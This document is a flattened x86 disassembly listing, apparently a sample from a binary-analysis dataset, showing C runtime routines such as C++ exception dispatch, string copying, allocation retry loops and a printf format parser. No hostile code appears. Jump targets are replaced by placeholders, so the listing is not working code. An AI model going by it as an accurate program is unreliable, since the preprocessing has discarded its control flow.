push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_416c68
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_41576b
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_41576b
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_41576b
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_41bd69
test eax eax
pop ecx
pop ecx
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_4100b7
add esp 0x14
mov edi eax
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_4171f8
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_416715
pop ecx
pop ecx
mov edi [ ebp + 0x18 ]
mov eax [ ebp - 0x8 ]
cmp [ edi ] eax
jg r-xdata
call sub_41576b
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
add edi 0x14
jmp r-xdata
cmp eax [ edi + 0x4 ]
jg r-xdata
call sub_41576b
mov edi [ eax + 0x94 ]
call sub_41576b
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_41678e
test al al
pop ecx
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x1c ]
jae r-xdata
mov eax [ edi + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0xc ]
test eax eax
mov [ ebp - 0x18 ] eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_41678e
test al al
pop ecx
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
test eax eax
mov [ ebp - 0x14 ] eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_40fba2
test al al
jne r-xdata
call sub_4171f8
cmp eax 0x19930522
jne r-xdata
call sub_41576b
call sub_41576b
call sub_41576b
mov [ eax + 0x88 ] esi
call sub_41576b
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
call sub_41654f
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_416715
pop ecx
pop ecx
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp + 0x8 ] r--data
call sub_41bd76
push r--data
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x2c ] r--data
call sub_40fe0c
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov ebx [ ebp - 0xc ]
push [ ebp + 0x20 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_416bfc
mov esi [ ebp + 0x8 ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_40fe8d
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_4165ef
add esp 0x10
push [ esi + 0x1c ]
call sub_416807
sub_4170c8
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_41576b
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_416d5a
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_4165ef
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4171f8
push 0x8
push r--data
call sub_4106dc
push [ rw-data ]
call sub_415561
pop ecx
test eax eax
je r-xdata
jmp sub_4171ac
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_417240
push ebp
mov ebp esp
sub esp 0x4
push ebx
push ecx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x10 ]
mov ebp [ ebp - 0x4 ]
call sub_41bf68
push esi
push edi
call eax
pop edi
pop esi
mov ebx ebp
pop ebp
mov ecx [ ebp + 0x10 ]
push ebp
mov ebp ebx
cmp ecx 0x100
jne r-xdata
push ecx
call sub_41bf68
pop ebp
pop ecx
pop ebx
leave
retn 0xc
mov ecx 0x2
sub_41728c
push ebp
mov ebp esp
sub esp 0x14
push ebx
xor ebx ebx
cmp [ ebp + 0x14 ] ebx
push esi
mov esi [ ebp + 0x8 ]
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
call sub_411077
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_413fad
add esp 0x14
mov eax esi
jmp r-xdata
cmp [ ebp + 0xc ] ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ ebp + 0x10 ]
cmp edi ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x14 ]
call sub_4110bb
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
mov [ esi ] bl
call sub_411077
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_413fad
add esp 0x14
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov edx [ ebp + 0xc ]
mov eax esi
jne r-xdata
push [ ebp + 0x14 ]
push edi
push [ ebp + 0xc ]
push esi
call sub_412d19
add esp 0x10
jmp r-xdata
mov eax esi
jmp r-xdata
mov cl [ edi ]
mov [ eax ] cl
inc eax
inc edi
cmp cl bl
je r-xdata
mov cl [ edi ]
mov [ eax ] cl
inc eax
inc edi
cmp cl bl
je r-xdata
cmp [ ebp - 0x8 ] bl
je r-xdata
pop edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edx
je r-xdata
cmp edx ebx
jne r-xdata
dec edx
jne r-xdata
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov [ eax ] bl
inc eax
dec [ ebp + 0x14 ]
jne r-xdata
mov ecx eax
sub ecx esi
cmp ecx 0x2
jl r-xdata
cmp [ edi ] bl
je r-xdata
jmp r-xdata
cmp [ ebp - 0x8 ] bl
je r-xdata
lea edi [ eax - 0x2 ]
cmp edi esi
mov [ ebp + 0x14 ] edi
jb r-xdata
lea edi [ eax - 0x1 ]
cmp edi esi
mov [ ebp - 0x4 ] edi
jb r-xdata
cmp [ ebp + 0x14 ] 0x1
jne r-xdata
xor eax eax
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov eax edi
sub eax [ ebp + 0x14 ]
test al 0x1
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x14 ]
movzx eax [ eax ]
push eax
call sub_41299c
test eax eax
pop ecx
pop ecx
je r-xdata
mov eax edi
sub eax [ ebp - 0x4 ]
test al 0x1
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
push eax
call sub_41299c
test eax eax
pop ecx
pop ecx
je r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
mov [ edi ] bl
call sub_411077
mov ecx eax
push 0x2a
pop eax
mov [ ecx ] eax
dec [ ebp + 0x14 ]
cmp [ ebp + 0x14 ] esi
jae r-xdata
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jae r-xdata
mov [ esi ] bl
call sub_411077
push 0x22
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_413fad
add esp 0x14
cmp [ ebp - 0x8 ] bl
je r-xdata
mov eax [ ebp + 0xc ]
cmp eax 0x1
jbe r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov [ esi + eax - 0x1 ] bl
lea edi [ esi + eax - 0x2 ]
cmp edi esi
mov [ ebp + 0x14 ] edi
jb r-xdata
push 0x50
pop eax
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx edi
sub ecx [ ebp + 0x14 ]
test cl 0x1
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x14 ]
movzx eax [ eax ]
push eax
call sub_41299c
test eax eax
pop ecx
pop ecx
je r-xdata
mov [ edi ] bl
jmp r-xdata
mov eax [ ebp + 0xc ]
dec [ ebp + 0x14 ]
cmp [ ebp + 0x14 ] esi
jae r-xdata
cmp [ ebp - 0x8 ] bl
je r-xdata
sub_417499
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
cmp eax 0xffffffff
mov esi eax
jne r-xdata
or eax 0xffffffff
push [ esp + 0xc ]
call sub_40f80e
mov edi eax
test edi edi
pop ecx
jne r-xdata
sub_4174d9
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
cmp eax 0xffffffff
mov esi eax
jne r-xdata
or eax 0xffffffff
push 0x0
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_40f6a1
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_417521
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
retn
cmp [ esp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
cmp eax 0xffffffff
mov esi eax
jne r-xdata
or eax 0xffffffff
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_40f8e7
mov edi eax
test edi edi
pop ecx
pop ecx
jne r-xdata
sub_41756c
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
retn
cmp [ esp + 0x14 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
cmp eax 0xffffffff
mov esi eax
jne r-xdata
or eax 0xffffffff
push [ esp + 0x14 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_40fb02
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_4175bc
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_4133af
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_4175ef
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_4175bc
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_417613
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ esp + 0xc ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov al [ ebx ]
dec [ esp + 0xc ]
mov ecx edi
call sub_4175bc
inc ebx
cmp [ esi ] 0xffffffff
jne r-xdata
pop esi
pop ebx
retn
mov eax [ esp + 0xc ]
add [ esi ] eax
jmp r-xdata
call sub_411077
cmp [ eax ] 0x2a
jne r-xdata
mov ecx edi
mov al 0x3f
call sub_4175bc
sub_41765d
push ebp
lea ebp [ esp - 0x1f8 ]
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x1f4 ] eax
mov eax [ ebp + 0x200 ]
push ebx
mov ebx [ ebp + 0x204 ]
push esi
xor esi esi
push edi
mov edi [ ebp + 0x20c ]
push [ ebp + 0x208 ]
lea ecx [ ebp - 0x5c ]
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x64 ] esi
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x40 ] esi
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x3c ] esi
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x44 ] esi
call sub_4110bb
cmp [ ebp - 0x30 ] esi
jne r-xdata
mov eax [ ebp - 0x30 ]
test [ eax + 0xc ] 0x40
jne r-xdata
call sub_411077
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
push esi
cmp ebx esi
je r-xdata
push eax
call sub_41b6c0
cmp eax 0xffffffff
pop ecx
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x54 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
test dl dl
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x48 ] esi
mov [ ebp - 0x60 ] esi
mov [ ebp - 0x19 ] dl
je r-xdata
mov eax rw-data
push [ ebp - 0x30 ]
call sub_41b6c0
cmp eax 0xfffffffe
pop ecx
je r-xdata
mov ecx [ ebp + 0x1f4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40f589
add ebp 0x1f8
leave
retn
cmp [ ebp - 0x50 ] 0x0
je r-xdata
inc ebx
xor eax eax
cmp [ ebp - 0x34 ] eax
mov [ ebp - 0x4c ] ebx
jl r-xdata
push [ ebp - 0x30 ]
call sub_41b6c0
cmp eax 0xffffffff
pop ecx
je r-xdata
push [ ebp - 0x30 ]
call sub_41b6c0
push [ ebp - 0x30 ]
sar eax 0x5
lea esi [ eax * 4 + rw-data ]
call sub_41b6c0
and eax 0x1f
imul eax eax 0x28
add eax [ esi ]
pop ecx
pop ecx
xor esi esi
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov eax [ ebp - 0x54 ]
and [ eax + 0x70 ] 0xfffffffd
xor esi esi
cmp [ ebp - 0x48 ] esi
je r-xdata
mov cl dl
sub cl 0x20
cmp cl 0x58
ja r-xdata
mov eax rw-data
push [ ebp - 0x30 ]
call sub_41b6c0
cmp eax 0xfffffffe
pop ecx
je r-xdata
test [ eax + 0x24 ] 0x7f
jne r-xdata
cmp [ ebp - 0x48 ] 0x7
jne r-xdata
mov ecx [ ebp - 0x48 ]
imul eax eax 0x9
movzx eax [ eax + ecx + r--data ]
push 0x8
shr eax 0x4
pop esi
cmp eax esi
mov [ ebp - 0x48 ] eax
je r-xdata
movsx eax dl
movzx eax [ eax + r--data ]
and eax 0xf
push [ ebp - 0x30 ]
call sub_41b6c0
push [ ebp - 0x30 ]
sar eax 0x5
lea esi [ eax * 4 + rw-data ]
call sub_41b6c0
and eax 0x1f
imul eax eax 0x28
add eax [ esi ]
pop ecx
pop ecx
xor esi esi
jmp r-xdata
call sub_411077
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
push 0x7
pop ecx
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
call sub_413fad
add esp 0x14
cmp [ ebp - 0x50 ] 0x0
je r-xdata
mov ebx [ ebp - 0x4c ]
mov al [ ebx ]
test al al
mov [ ebp - 0x19 ] al
je r-xdata
jmp [ eax * 4 + jump_table_417fed ]
mov edi [ ebp - 0x2c ]
mov dl al
jmp r-xdata
xor eax eax
or [ ebp - 0x20 ] 0xffffffff
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x44 ] eax
jmp r-xdata
movsx eax dl
sub eax 0x20
je r-xdata
cmp dl 0x2a
jne r-xdata
and [ ebp - 0x20 ] 0x0
jmp r-xdata
cmp dl 0x2a
jne r-xdata
cmp dl 0x49
je r-xdata
and [ ebp - 0x44 ] 0x0
lea eax [ ebp - 0x5c ]
push eax
movzx eax dl
push eax
call sub_41b87d
pop ecx
test eax eax
mov al [ ebp - 0x19 ]
pop ecx
je r-xdata
movsx eax dl
cmp eax 0x64
jg r-xdata
or [ ebp - 0x18 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x40 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x40 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x2c ] edi
mov edi [ edi - 0x4 ]
test edi edi
mov [ ebp - 0x40 ] edi
jge r-xdata
mov eax [ ebp - 0x20 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x20 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x2c ] edi
mov edi [ edi - 0x4 ]
test edi edi
mov [ ebp - 0x20 ] edi
jge r-xdata
mov al [ ebx ]
cmp al 0x36
jne r-xdata
cmp dl 0x68
je r-xdata
mov ecx [ ebp - 0x30 ]
lea esi [ ebp - 0x34 ]
call sub_4175bc
jmp r-xdata
mov ecx [ ebp - 0x30 ]
lea esi [ ebp - 0x34 ]
call sub_4175bc
mov al [ ebx ]
inc ebx
test al al
mov [ ebp - 0x4c ] ebx
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x18 ] 0x80
jmp r-xdata
sub eax esi
je r-xdata
or [ ebp - 0x18 ] 0x4
neg [ ebp - 0x40 ]
jmp r-xdata
or [ ebp - 0x20 ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
cmp [ ebx + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x18 ] 0x20
jmp r-xdata
cmp dl 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x18 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x18 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
cmp [ ebx + 0x1 ] 0x32
jne r-xdata
inc ebx
inc ebx
or [ ebp - 0x18 ] 0x8000
mov [ ebp - 0x4c ] ebx
jmp r-xdata
cmp [ ebx ] 0x6c
jne r-xdata
cmp dl 0x77
jne r-xdata
mov ecx [ ebp - 0x20 ]
cmp ecx 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x20 ] esi
cmp eax 0x65
jl r-xdata
test cx 0x1000
jne r-xdata
add edi esi
mov eax [ edi - 0x8 ]
mov edx [ edi - 0x4 ]
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x18 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al 0x69
je r-xdata
inc ebx
inc ebx
and [ ebp - 0x18 ] 0xffff7fff
mov [ ebp - 0x4c ] ebx
jmp r-xdata
or [ ebp - 0x18 ] 0x10
jmp r-xdata
inc ebx
or [ ebp - 0x18 ] 0x1000
mov [ ebp - 0x4c ] ebx
jmp r-xdata
or [ ebp - 0x18 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x18 ] 0x810
mov [ ebp - 0x2c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x24 ] edi
je r-xdata
mov ecx 0x7fffffff
mov [ ebp - 0x28 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x18 ] 0x80
mov [ ebp - 0x28 ] 0x10
je r-xdata
cmp [ ebp - 0x68 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x64 ] ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
test [ ebp - 0x18 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x18 ] esi
jmp r-xdata
cmp al 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebp - 0x64 ] 0x27
mov ecx [ ebp - 0x18 ]
test cx cx
jns r-xdata
mov al [ ebp - 0x64 ]
add al 0x51
mov [ ebp - 0x38 ] 0x30
mov [ ebp - 0x37 ] al
mov [ ebp - 0x3c ] 0x2
jmp r-xdata
cmp [ ebp - 0x60 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
test al 0x40
je r-xdata
or [ ebp - 0x18 ] 0x40
cmp [ ebp - 0x20 ] 0x0
lea ebx [ ebp - 0x14 ]
mov eax 0x200
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x6c ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
test cl 0x40
mov eax [ edi - 0x4 ]
je r-xdata
test cl 0x40
mov [ ebp - 0x2c ] edi
je r-xdata
test [ ebp - 0x18 ] 0x9000
mov ebx edx
mov edi eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
test eax eax
mov [ ebp - 0x2c ] edi
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x18 ] 0x800
add dl 0x20
mov [ ebp - 0x74 ] 0x1
mov [ ebp - 0x19 ] dl
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x44 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x24 ] eax
push [ ebp - 0x60 ]
call sub_40f613
and [ ebp - 0x60 ] 0x0
pop ecx
mov ebx [ ebp - 0x40 ]
sub ebx [ ebp - 0x28 ]
sub ebx [ ebp - 0x3c ]
test [ ebp - 0x18 ] 0xc
jne r-xdata
test ax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x20 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x20 ] 0x0
jge r-xdata
xor ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x24 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
dec eax
dec eax
jne r-xdata
test [ ebp - 0x18 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
push [ ebp - 0x3c ]
mov edi [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
lea ecx [ ebp - 0x38 ]
call sub_417613
test [ ebp - 0x18 ] 0x8
pop ecx
je r-xdata
push [ ebp - 0x30 ]
lea eax [ ebp - 0x34 ]
push ebx
push 0x20
call sub_4175ef
add esp 0xc
test al 0x1
je r-xdata
mov [ ebp - 0x38 ] 0x2d
jmp r-xdata
cmp [ ebp - 0x20 ] eax
jle r-xdata
cmp dl 0x67
jne r-xdata
add edi esi
mov eax [ edi - 0x8 ]
mov [ ebp - 0x80 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x7c ] eax
lea eax [ ebp - 0x5c ]
push eax
push [ ebp - 0x74 ]
movsx eax dl
push [ ebp - 0x20 ]
mov [ ebp - 0x2c ] edi
push eax
push [ ebp - 0x6c ]
lea eax [ ebp - 0x80 ]
push ebx
push eax
push [ rw-data ]
call sub_415561
pop ecx
call eax
mov edi [ ebp - 0x18 ]
add esp 0x1c
and edi 0x80
je r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x2c ] edi
call sub_41b6ed
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x18 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x20 ] eax
jle r-xdata
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x18 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x28 ] eax
test [ ebp - 0x18 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x24 ] ecx
je r-xdata
add edi 0x4
test [ ebp - 0x18 ] 0x810
mov [ ebp - 0x2c ] edi
je r-xdata
or [ ebp - 0x18 ] 0x800
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp al 0x58
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x24 ]
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x24 ]
sar eax 0x1
jmp r-xdata
cmp [ ebp - 0x44 ] 0x0
mov eax [ ebp - 0x28 ]
je r-xdata
test [ ebp - 0x18 ] 0x4
jne r-xdata
test al 0x2
je r-xdata
mov [ ebp - 0x38 ] 0x2b
jmp r-xdata
mov [ ebp - 0x3c ] 0x1
cmp [ ebp - 0x20 ] 0xa3
jle r-xdata
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x20 ] 0x1
jmp r-xdata
cmp [ ebp - 0x19 ] 0x67
jne r-xdata
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
test [ ebp - 0x18 ] 0x20
je r-xdata
test [ ebp - 0x18 ] 0x80
mov [ ebp - 0x28 ] esi
je r-xdata
mov eax edi
or eax ebx
jne r-xdata
mov [ ebp - 0x20 ] eax
and [ ebp - 0x44 ] 0x0
jmp r-xdata
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x44 ] 0x1
jmp r-xdata
mov al [ edi - 0x4 ]
mov [ ebp - 0x14 ] al
mov [ ebp - 0x28 ] 0x1
movzx eax [ edi - 0x4 ]
push eax
push 0x200
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
call sub_41b862
add esp 0x10
test eax eax
je r-xdata
and [ ebp - 0x48 ] 0x0
inc eax
inc eax
inc eax
mov ecx [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x34 ]
call sub_417613
pop ecx
test eax eax
jle r-xdata
push edi
push ebx
push 0x30
lea eax [ ebp - 0x34 ]
call sub_4175ef
add esp 0xc
mov [ ebp - 0x38 ] 0x20
mov esi [ ebp - 0x20 ]
add esi 0x15d
push esi
call sub_417499
test eax eax
mov dl [ ebp - 0x19 ]
pop ecx
mov [ ebp - 0x60 ] eax
